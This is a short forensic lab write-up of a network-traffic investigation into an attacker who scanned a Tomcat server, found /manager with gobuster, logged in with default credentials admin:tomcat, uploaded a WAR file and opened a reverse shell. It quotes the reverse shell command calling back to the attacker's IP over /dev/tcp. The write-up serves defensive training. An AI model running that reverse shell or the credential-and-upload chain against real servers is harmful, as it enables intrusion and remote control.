10. Tomcat Takeover Lab
Analysis
Network traffic was analyzed using Wireshark to investigate suspicious activity targeting a web server running Apache Tomcat. The analysis focused on identifying scanning behavior, web enumeration, authentication attempts, file uploads, and reverse shell activity. Custom filters, HTTP analysis, and TCP stream reconstruction were used to trace the full attack chain from initial reconnaissance to persistence.

Findings
- Traffic analysis revealed scanning behavior across multiple ports originating from a single source:
       Attacker IP: 14.0.0.120
- Geolocation of the attacker’s IP address identified the origin of the activity:
       Country: China
- Port scanning results revealed access to the Tomcat administrative interface:
       Admin panel port: 8080
- HTTP response analysis (404 errors) and User-Agent inspection identified the enumeration tool used:
       Tool: gobuster
- Successful directory discovery was identified by analyzing HTTP 200 responses:
       Admin directory: /manager
- Authentication analysis revealed successful brute-force login credentials via Basic Auth:
       Username and password: admin:tomcat
- HTTP POST requests confirmed the upload of a malicious payload:
       Uploaded file: JXQOZY.war
- TCP stream analysis revealed the command used to establish persistence via reverse shell:
       Command:   /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

Conclusion
The investigation confirms a full compromise of the Apache Tomcat server. The attacker performed reconnaissance through port scanning, followed by directory enumeration using gobuster. Brute-force authentication allowed access to the admin panel, enabling the upload of a malicious WAR file. This led to the establishment of a reverse shell and persistence on the system. The attack demonstrates a complete exploitation chain involving discovery, credential access, remote execution, and long-term persistence.
